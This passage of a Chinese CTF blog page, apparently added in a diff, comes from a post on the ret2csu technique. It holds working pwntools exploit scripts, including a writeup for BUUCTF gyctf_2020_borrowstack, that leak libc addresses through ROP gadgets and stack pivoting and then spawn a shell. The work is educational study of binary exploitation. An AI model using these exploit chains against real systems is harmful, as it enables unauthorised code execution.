class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>) <span class="comment">#这个用来筛选一下我们要找的数据</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(term_proc)  <span class="comment">#此时call一个空函数，我们用ret来劫持执行流</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#r13 r14 r15</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(modify_rax)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bin_sh_addr) <span class="comment">#把参数放到rdi里面</span></span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>##BUUCTF上的gyctf_2020_borrowstack</p>
+<p>这道题，我已经在栈迁移的那篇博客中发过了，这篇里面我就展示一下WP吧，具体细节可以看一下栈迁移的那篇博客。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>ZIKH26
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://zikh26.github.io/2022/04/26/ret2csu/" title="关于学习ret2csu的总结">https://zikh26.github.io/2022/04/26/ret2csu/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="tag"># 学习总结</a>
+              <a href="/tags/ret2csu/" rel="tag"># ret2csu</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/26/ret2syscall/" rel="prev" title="ret2syscall的做题思路（以32位程序为例）">
+      <i class="fa fa-chevron-left"></i> ret2syscall的做题思路（以32位程序为例）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/26/ret2_dl_runtime_resolve/" rel="next" title="关于学习ret2_dl_runtime_resolve的总结">
+      关于学习ret2_dl_runtime_resolve的总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFret2csu%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是ret2csu？</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZIKH26"
+      src="/images/20220411214643.jpg">
+  <p class="site-author-name" itemprop="name">ZIKH26</p>
+  <div class="site-description" itemprop="description">未来一位优秀的pwner的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ZIKH26" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZIKH26" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZIKH26</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
